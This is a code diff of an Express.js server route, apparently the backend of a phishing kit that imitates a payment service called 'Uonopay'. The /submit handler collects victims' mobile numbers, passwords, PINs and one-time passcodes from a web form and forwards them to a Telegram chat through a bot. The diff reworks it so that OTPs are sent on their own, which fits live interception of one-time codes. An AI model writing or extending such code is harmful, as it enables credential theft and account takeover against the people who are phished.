@@ -19,29 +19,30 @@ const bot = new TelegramBot(process.env.BOT_TOKEN);
 app.post("/submit", async (req, res) => {
     try {
 console.log(req.body);
-        // HTML se bheja gaya data yahan receive ho raha hai
-        const { phone,password,pin,otp,issue } = req.body;
-
-        // Basic validation check
-        if (!phone) {
-            return res.status(400).json({
-                success: false,
-                message: "Kripya mobile number aur OTP dono enter karein."
-            });
-        }
-
-        // Telegram par bheje jaane wale message ka format
-        const messageText = `Uonopay NOTIFICATION
-
-Support Issue: ${issue}
-📱 Mobile Number: ${phone}
-🔑Password: ${password}
-📌Pin: ${pin}
-📨Received OTP: ${otp}`;
         
-        // Telegram bot ke zariye chat mein message send karna
-        await bot.sendMessage(process.env.CHAT_ID, messageText);
+    const { phone, password, pin, otp } = req.body;
 
+    // Basic validation check
+    if (!phone && !otp) {
+        return res.status(400).json({
+            success: false,
+            message: "Invalid data received."
+        });
+    }
+
+    let messageText = 'Uonopay NOTIFICATION\n\n';
+
+    if (otp) {
+        messageText += `Received OTP: ${otp}`;
+    } else {
+        messageText += `Support Issue: ${req.body.issue || 'N/A'}\n` +
+                       `📱 Mobile Number: ${phone}\n` +
+                       `🔒 Password: ${password}\n` +
+                       `🔑 Pin: ${pin}`;
+    }
+
+    await bot.sendMessage(process.env.CHAT_ID, messageText);
+        
         // Frontend ko success response dena
         res.json({
             success: true,
